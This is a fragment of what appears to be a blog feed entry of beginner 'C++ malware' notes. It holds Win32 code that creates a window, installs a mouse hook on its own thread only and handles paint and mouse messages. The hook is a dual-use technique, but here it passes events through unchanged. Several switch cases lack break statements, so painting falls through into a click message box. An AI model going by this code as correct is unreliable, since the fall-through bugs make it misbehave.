class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WindowProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="comment">//CALLBACK 从右向左入栈</span></span></span></span><br><span class="line"><span class="params"><span class="function"><span class="comment">//LRESULT long</span></span></span></span><br><span class="line"><span class="params"><span class="function"><span class="comment">//该函数处理窗口消息</span></span></span></span><br><span class="line"><span class="params"><span class="function"></span></span></span><br><span class="line"><span class="params"><span class="function">HWND hWnd,<span class="comment">//窗口句柄类型</span></span></span></span><br><span class="line"><span class="params"><span class="function">UINT uMsg,<span class="comment">//unsigned int, 消息</span></span></span></span><br><span class="line"><span class="params"><span class="function">WPARAM wParam,<span class="comment">//unsigned int </span></span></span></span><br><span class="line"><span class="params"><span class="function">LPARAM lParam <span class="comment">//long int</span></span></span></span><br><span class="line"><span class="params"><span class="function"></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line">HHOOK MouseHook;</span><br><span class="line"><span class="comment">//鼠标钩子处理函数</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">MouseProc</span><span class="params">(<span class="type">int</span> nCode, WPARAM wParam, LPARAM lParam)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">WinMain</span><span class="params">(<span class="comment">//窗口应用GUI</span></span></span></span><br><span class="line"><span class="params"><span class="function">HINSTANCE hInstance,<span class="comment">//当前程序的实例句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function"><span class="comment">//HINSTANCE ：实例句柄类型</span></span></span></span><br><span class="line"><span class="params"><span class="function"></span></span></span><br><span class="line"><span class="params"><span class="function">HINSTANCE hPreInstance,<span class="comment">//为了兼容16位应用程序，永远为空</span></span></span></span><br><span class="line"><span class="params"><span class="function"></span></span></span><br><span class="line"><span class="params"><span class="function">LPSTR lpCmdLine,<span class="comment">//命令行参数</span></span></span></span><br><span class="line"><span class="params"><span class="function"><span class="comment">//LPSTR：char *</span></span></span></span><br><span class="line"><span class="params"><span class="function"></span></span></span><br><span class="line"><span class="params"><span class="function"><span class="type">int</span> nCmdShow<span class="comment">//窗口的显示方式</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1.做一个窗口</span></span><br><span class="line"><span class="comment">//1.1设计窗口类 Spy++</span></span><br><span class="line">TCHAR szAppClassName[] = <span class="built_in">TEXT</span>(<span class="string">&quot;Joe1sn&quot;</span>);<span class="comment">//自动适应字符集</span></span><br><span class="line">WNDCLASS wndClass = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">wndClass.hbrBackground = (HBRUSH)<span class="built_in">GetStockObject</span>(WHITE_BRUSH);<span class="comment">//加载白色画刷</span></span><br><span class="line">wndClass.hCursor = <span class="built_in">LoadCursor</span>(<span class="literal">NULL</span>, IDC_ARROW);<span class="comment">//加载光标</span></span><br><span class="line">wndClass.hInstance = hInstance;<span class="comment">//当前窗口实例句柄</span></span><br><span class="line">wndClass.lpfnWndProc = WindowProc;<span class="comment">//窗口处理函数</span></span><br><span class="line">wndClass.lpszClassName = szAppClassName;<span class="comment">//窗口类型</span></span><br><span class="line">wndClass.style = CS_HREDRAW | CS_VREDRAW; <span class="comment">//窗口类的风格</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//1.2注册窗口类</span></span><br><span class="line"><span class="built_in">RegisterClass</span>(&amp;wndClass);</span><br><span class="line"></span><br><span class="line"><span class="comment">//1.3创建窗口类</span></span><br><span class="line">HWND hWnd = <span class="built_in">CreateWindow</span>(szAppClassName,</span><br><span class="line"><span class="built_in">TEXT</span>(<span class="string">&quot;Test&quot;</span>),</span><br><span class="line">WS_BORDER | WS_CAPTION | WS_SYSMENU | WS_MAXIMIZEBOX | WS_MINIMIZEBOX,</span><br><span class="line"><span class="number">500</span>, <span class="number">200</span>, <span class="number">800</span>, <span class="number">600</span>,</span><br><span class="line"><span class="literal">NULL</span>, <span class="literal">NULL</span>, hInstance, <span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">//1.4显示和更新窗口</span></span><br><span class="line"><span class="built_in">ShowWindow</span>(hWnd,SW_SHOW);<span class="comment">//显示</span></span><br><span class="line"><span class="built_in">UpdateWindow</span>(hWnd);<span class="comment">//更新窗口</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//1.5消息循环</span></span><br><span class="line"><span class="comment">//（参考QT的信号和槽?）</span></span><br><span class="line"><span class="comment">//应用程序-&gt;操作系统-&gt;消息队列-&gt;应用程序</span></span><br><span class="line">MSG msg;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">GetMessage</span>(&amp;msg,<span class="literal">NULL</span>,<span class="number">0</span>,<span class="number">0</span>))<span class="comment">//所有消息都要获取</span></span><br><span class="line"> <span class="comment">//WM_QIT，返回0，结束循环</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//将虚拟键消息转为字符消息</span></span><br><span class="line"><span class="comment">//windows只能识别虚拟键值 VK_UP VK_DOWN</span></span><br><span class="line"><span class="built_in">TranslateMessage</span>(&amp;msg);</span><br><span class="line"></span><br><span class="line"><span class="comment">//将消息分发给窗口处理函数</span></span><br><span class="line"><span class="comment">//这里是WinProc</span></span><br><span class="line"><span class="built_in">DispatchMessage</span>(&amp;msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//鼠标钩子处理函数</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">MouseProc</span><span class="params">(<span class="type">int</span> nCode, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//int x = LOWORD(lParam);</span></span><br><span class="line"><span class="comment">//int y = HIWORD(lParam);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//x += 100;</span></span><br><span class="line"><span class="comment">//lParam = MAKELONG(x,y);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*if (wParam == VK_F2)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">SendMessage(hWnd, WM_CLOSE, 0, 0);</span></span><br><span class="line"><span class="comment">UnhookWindowsHookW(MouseHook);</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">CallNextHookEx</span>(MouseHook,nCode,wParam,lParam);<span class="comment">//向下传递</span></span><br><span class="line"><span class="comment">//return 1;//返回非0，表示消息已被处理，这样系统就不会把这个消息传递给程序</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WindowProc</span><span class="params">(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PAINTSTRUCT ps;<span class="comment">//</span></span><br><span class="line">HDC hDC;<span class="comment">//绘图DC</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (uMsg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//进程类hook</span></span><br><span class="line"><span class="keyword">case</span> WM_CREATE:<span class="comment">//窗口创建消息</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//安装hook</span></span><br><span class="line">MouseHook = <span class="built_in">SetWindowsHookEx</span>(WH_MOUSE, MouseProc, <span class="literal">NULL</span>, <span class="built_in">GetCurrentThreadId</span>());</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> WM_CLOSE:<span class="comment">//窗口关闭消息</span></span><br><span class="line"><span class="built_in">DestroyWindow</span>(hWnd);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> WM_DESTROY:<span class="comment">//窗口销毁消息</span></span><br><span class="line"><span class="built_in">PostQuitMessage</span>(<span class="number">0</span>);<span class="comment">//发送WM_QUIT就会退出</span></span><br><span class="line"><span class="keyword">case</span> WM_PAINT:<span class="comment">//窗口绘图消息</span></span><br><span class="line">&#123;</span><br><span class="line">hDC = <span class="built_in">BeginPaint</span>(hWnd, &amp;ps);</span><br><span class="line">HPEN hPen = <span class="built_in">CreatePen</span>(PS_SOLID, <span class="number">5</span>, <span class="built_in">RGB</span>(<span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line"><span class="built_in">SelectObject</span>(hDC, hPen);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Ellipse</span>(hDC, <span class="number">0</span>, <span class="number">0</span>, <span class="number">200</span>, <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">EndPaint</span>(hWnd, &amp;ps);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> WM_LBUTTONDOWN:<span class="comment">//鼠标左键点击消息</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(hWnd, <span class="built_in">TEXT</span>(<span class="string">&quot;Left&quot;</span>), <span class="built_in">TEXT</span>(<span class="string">&quot;Titile&quot;</span>), MB_OK);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> WM_RBUTTONDOWN:<span class="comment">//鼠标右键点击消息</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(hWnd, <span class="built_in">TEXT</span>(<span class="string">&quot;Right&quot;</span>), <span class="built_in">TEXT</span>(<span class="string">&quot;Titile&quot;</span>), MB_OK);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> WM_MOUSEMOVE:</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> x = <span class="built_in">LOWORD</span>(lParam);</span><br><span class="line"><span class="type">int</span> y = <span class="built_in">HIWORD</span>(lParam);</span><br><span class="line"><span class="type">wchar_t</span> str[<span class="number">0x100</span>];</span><br><span class="line"><span class="built_in">wsprintf</span>(str, <span class="string">L&quot;当前鼠标坐标(%d , %d)&quot;</span>,x,y);</span><br><span class="line"><span class="comment">//SetWindowText(hWnd, TEXT(&quot;In&quot;));</span></span><br><span class="line"><span class="built_in">SetWindowText</span>(hWnd, str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">DefWindowProc</span>(hWnd, uMsg, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;c恶意软件入门笔记&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#c恶意软件入门笔记&quot;&gt;&lt;/a&gt; C++恶意软件入门笔记&lt;/h1&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="c/c++笔记" scheme="https://joe1sn.eu.org/tags/c-c-%E7%AC%94%E8%AE%B0/"/>
    
    <category term="notes" scheme="https://joe1sn.eu.org/tags/notes/"/>
    
  </entry>
  
</feed>
